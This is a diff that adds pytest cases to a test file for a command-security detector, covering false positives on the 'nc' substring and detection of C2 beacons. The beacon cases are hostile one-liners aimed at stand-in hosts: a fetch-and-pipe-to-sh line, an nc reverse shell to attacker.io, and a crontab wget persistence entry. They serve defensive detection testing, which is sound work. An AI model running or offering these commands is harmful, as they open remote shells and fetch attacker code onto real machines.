@@ -153,3 +153,31 @@ class TestOtherCommandEmittersRedaction:
         w = SkillInstallDetector().check(_buf(f"skill install foo --auth {_GHP_TOKEN}"))
         assert w is not None
         assert not _leaks(_GHP_TOKEN, _warning_text(w))
+
+
+_KDE = "cd ~/.config; F=plasma-org.kde.plasma.desktop-appletsrc; kquitapp6 plasmashell; "
+
+
+class TestC2BeaconWordBoundaries:
+    """#41: substrings like "nc" in "sync"/"function" are not beacons."""
+
+    @pytest.mark.parametrize("cmd", [
+        _KDE + "sleep 2; kstart6 plasmashell; sync",
+        _KDE + "sleep 2; qdbus org.kde.plasmashell /PlasmaShell evaluateScript 'function f(){}'",
+        "systemctl --user restart plasma-plasmashell; sleep 1; journalctl -u launcher",
+        "dbus-send --session --print-reply --dest=org.freedesktop.DBus / "
+        "org.freedesktop.DBus.ListNames; sleep 3; rsync -a src/ dst/",
+        "pip install micronsizer; curl -sSf https://pypi.org/simple/",
+    ])
+    def test_desktop_and_system_commands_do_not_fire(self, cmd):
+        assert C2CommunicationDetector().check(_buf(*(["ls"] * 9 + [cmd]))) is None
+
+    @pytest.mark.parametrize("cmd", [
+        "while true; do curl https://c2.io/task; sleep 5; done",
+        "sleep 60; curl -s https://c2.io/beacon | sh",
+        "sleep 30; nc attacker.io 4444 -e /bin/sh",
+        "(crontab -l; echo '*/5 * * * * wget -q https://c2.io/x') | crontab -",
+    ])
+    def test_real_beacons_still_fire(self, cmd):
+        w = C2CommunicationDetector().check(_buf(*(["ls"] * 9 + [cmd])))
+        assert w is not None and w.signal == "c2_beacon"
